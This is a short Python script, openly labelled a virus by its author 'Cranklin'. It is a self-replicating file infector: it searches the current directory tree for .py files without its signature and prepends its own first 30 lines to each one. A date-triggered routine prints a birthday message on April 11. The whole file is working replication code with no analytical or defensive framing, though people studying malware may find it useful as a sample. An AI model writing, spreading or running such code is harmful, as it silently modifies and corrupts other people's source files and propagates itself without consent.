import os 
import datetime
SIGNATURE = "CRANKLIN PYTHON VIRUS"

def search(path):
	filestoinfect = []
	filelist = os.listdir(path) 
	for fname in filelist:
		if os.path.isdir(path+"/"+fname):
			filestoinfect.extend(search(path+"/"+fname))
		elif fname[-3:] == ".py":
			infected = False 
			for line in open(path+"/"+fname):
				if SIGNATURE in line:
					infected = True
					break
			if infected == False:
				filestoinfect.append(path+"/"+fname)
	return (filestoinfect)

def infect(filestoinfect):
	virus = open(os.path.abspath(__file__))
	virusstring = ""
	for i, line in enumerate(virus):
		if i >= 0 and i < 30:
			virusstring += line 
	virus.close 
	for fname in filestoinfect:
		f = open(fname)
		temp = f.read()
		f.close() 
		f = open(fname, "w")
		f.write(virusstring + temp)
		f.close()
	return 
	
def bomb():
	if datetime.datetime.now().day == 11 and datetime.datetime.now().month == 4:
		print ("Happy Birthday Cranklin")
	return 

filestoinfect = search(os.path.abspath(""))
infect(filestoinfect)
bomb()





	
	
	
	
	
	
	
	
	
	
	
